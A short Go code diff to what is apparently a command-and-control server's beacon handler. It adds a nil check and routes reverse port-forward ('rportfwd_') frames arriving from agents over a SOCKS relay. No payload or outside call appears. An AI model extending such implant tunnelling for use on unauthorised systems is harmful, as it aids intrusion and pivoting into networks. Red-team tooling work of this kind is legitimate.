@@ -93,6 +93,9 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 
 	// Helper to extract metadata from info map
 	parseInt := func(key string) int {
+		if req.Info == nil {
+			return 0
+		}
 		if v, err := strconv.Atoi(req.Info[key]); err == nil {
 			return v
 		}
@@ -494,9 +497,15 @@ func (s *Server) processBeacon(req beaconRequest) beaconResponse {
 	}
 
 	// ── SOCKS Relay Integration ───────────────────────────────────────────────
-	// Process relay data coming FROM the agent
+	// Process relay data coming FROM the agent (includes rportfwd frames)
 	if len(req.SocksData) > 0 {
 		s.processAgentSocksData(req.UUID, req.SocksData)
+		// Handle rportfwd response frames from agent
+		for _, f := range req.SocksData {
+			if strings.HasPrefix(f.Action, "rportfwd_") {
+				s.processRPortFwdData(req.UUID, f)
+			}
+		}
 	}
 	// Collect pending relay frames going TO the agent
 	if frames := s.collectSocksFrames(req.UUID); len(frames) > 0 {
